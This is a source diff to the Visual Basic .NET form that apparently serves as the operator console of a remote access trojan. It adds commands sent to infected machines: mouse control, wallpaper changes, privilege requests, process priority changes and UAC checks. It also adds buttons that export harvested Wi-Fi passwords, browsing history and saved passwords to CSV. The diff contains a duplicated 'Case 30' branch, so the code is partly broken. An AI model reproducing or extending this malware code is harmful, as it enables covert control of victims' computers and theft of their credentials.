@@ -205,6 +205,31 @@ Public Class Client_Form
                 P.Plugin = Plugins._SL
                 P.Function_Params = New Object() {Packet_Subject.BLUR_LK_STOP}
 
+            Case 26
+                P.Plugin = Plugins._MO
+                P.Function_Params = New Object() {Packet_Subject.MS_LEFT}
+
+            Case 27
+                P.Plugin = Plugins._MO
+                P.Function_Params = New Object() {Packet_Subject.MS_RIGHT}
+
+            Case 28
+                P.Plugin = Plugins._MO
+                P.Function_Params = New Object() {Packet_Subject.MS_MV}
+
+            Case 29
+                P.Plugin = Plugins._MO
+                P.Function_Params = New Object() {Packet_Subject.MS_ALL}
+
+            Case 30
+                P.Plugin = Plugins._MO
+                P.Function_Params = New Object() {Packet_Subject.MS_UNL}
+
+
+            Case 30
+                P.Plugin = Plugins._MS
+                P.Function_Params = New Object() {Packet_Subject.SET_WPP}
+
         End Select
 
         Await Task.Run(Sub() C.Sender(P))
@@ -230,6 +255,7 @@ Public Class Client_Form
     Private Sub Client_Form_Load(sender As Object, e As EventArgs) Handles MyBase.Load
 
         AddHandler Me.SizeChanged, AddressOf Make_Fiex
+
 
     End Sub
 
@@ -286,5 +312,131 @@ Public Class Client_Form
 
             Await Task.Run(Sub() C.Sender(P))
         End If
+    End Sub
+
+    Private Async Sub GetToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetToolStripMenuItem.Click
+        If Priv_ListView.SelectedItems.Count = 1 Then
+
+            Dim GetPriv As Native.NtDll.Enumerations._PRIVILEGES = CType(Priv_ListView.SelectedItems(0).Index + 1, Native.NtDll.Enumerations._PRIVILEGES)
+
+            'MessageBox.Show(GetPriv.ToString())
+            Dim P As New PacketMaker
+            P.Type_Packet = PacketType.PLUGIN_C
+            P.Plugin = Plugins._PR
+
+
+            P.Function_Params = New Object() {Packet_Subject.GET_PRIV, GetPriv}
+
+            Await Task.Run(Sub() C.Sender(P))
+
+
+        End If
+    End Sub
+
+    Private Async Sub Get_Prio_Btn_Click(sender As Object, e As EventArgs) Handles Get_Prio_Btn.Click
+        Dim P As New PacketMaker
+        P.Type_Packet = PacketType.PLUGIN_C
+        P.Plugin = Plugins._PR
+        P.Function_Params = New Object() {Packet_Subject.GET_PRIO}
+
+        Await Task.Run(Sub() C.Sender(P))
+    End Sub
+
+    Private Async Sub Change_Prio_Btn_Click(sender As Object, e As EventArgs) Handles Change_Prio_Btn.Click
+        If ComboBox1.Text.Length > 0 Then
+            Dim PrioToGet As Native.NtDll.Enumerations._PRIORITY_CLASS
+
+            Label3.Text = ""
+
+            Select Case ComboBox1.SelectedIndex
+                Case 0
+                    PrioToGet = Native.NtDll.Enumerations._PRIORITY_CLASS.NORMAL_PRIORITY_CLASS
+                Case 1
+                    PrioToGet = Native.NtDll.Enumerations._PRIORITY_CLASS.ABOVE_NORMAL_PRIORITY_CLASS
+                Case 2
+                    PrioToGet = Native.NtDll.Enumerations._PRIORITY_CLASS.HIGH_PRIORITY_CLASS
+                Case 3
+                    PrioToGet = Native.NtDll.Enumerations._PRIORITY_CLASS.BELOW_NORMAL_PRIORITY_CLASS
+                Case 4
+                    PrioToGet = Native.NtDll.Enumerations._PRIORITY_CLASS.IDLE_PRIORITY_CLASS
+            End Select
+
+            Dim P As New PacketMaker
+            P.Type_Packet = PacketType.PLUGIN_C
+            P.Plugin = Plugins._PR
+            P.Function_Params = New Object() {Packet_Subject.SET_PRIO, PrioToGet}
+
+            Await Task.Run(Sub() C.Sender(P))
+
+        End If
+    End Sub
+
+    Private Async Sub Chk_UAC_Btn_Click(sender As Object, e As EventArgs) Handles Chk_UAC_Btn.Click
+        Dim P As New PacketMaker
+        P.Type_Packet = PacketType.PLUGIN_C
+        P.Plugin = Plugins._PR
+        P.Function_Params = New Object() {Packet_Subject.CHECK_UAC}
+
+        Await Task.Run(Sub() C.Sender(P))
+    End Sub
+
+    Private Sub CSV_W_PW_Click(sender As Object, e As EventArgs) Handles CSV_W_PW.Click
+        Dim AddFile As New Thread(Sub()
+                                      Using ofd = New SaveFileDialog()
+                                          ofd.DefaultExt = ".csv"
+                                          ofd.Filter = ".csv (*.csv)|*.csv"
+                                          Dim Action As DialogResult = ofd.ShowDialog()
+                                          If Action = DialogResult.OK Then ' 
+
+                                              Utilities.Utils.ListViewToCSV.ToCSV(W_PW_ListView, ofd.FileName)
+
+                                          End If
+                                      End Using
+
+
+                                  End Sub)
+
+        AddFile.SetApartmentState(ApartmentState.STA)
+        AddFile.Start()
+    End Sub
+
+    Private Sub CSV_HISTORY_Click(sender As Object, e As EventArgs) Handles CSV_HISTORY.Click
+        Dim AddFile As New Thread(Sub()
+                                      Using ofd = New SaveFileDialog()
+                                          ofd.DefaultExt = ".csv"
+                                          ofd.Filter = ".csv (*.csv)|*.csv"
+                                          Dim Action As DialogResult = ofd.ShowDialog()
+                                          If Action = DialogResult.OK Then ' 
+
+                                              Utilities.Utils.ListViewToCSV.ToCSV(Hist_ListView, ofd.FileName)
+
+                                          End If
+                                      End Using
+
+
+                                  End Sub)
+
+        AddFile.SetApartmentState(ApartmentState.STA)
+        AddFile.Start()
+    End Sub
+
+    Private Sub CSV_PASSWORDS_Click(sender As Object, e As EventArgs) Handles CSV_PASSWORDS.Click
+        Dim AddFile As New Thread(Sub()
+                                      Using ofd = New SaveFileDialog()
+                                          ofd.DefaultExt = ".csv"
+                                          ofd.Filter = ".csv (*.csv)|*.csv"
+                                          Dim Action As DialogResult = ofd.ShowDialog()
+                                          If Action = DialogResult.OK Then ' 
+
+                                              Utilities.Utils.ListViewToCSV.ToCSV(Passwords_ListView, ofd.FileName)
+
+                                          End If
+                                      End Using
+
+
+                                  End Sub)
+
+        AddFile.SetApartmentState(ApartmentState.STA)
+        AddFile.Start()
     End Sub
 End Class
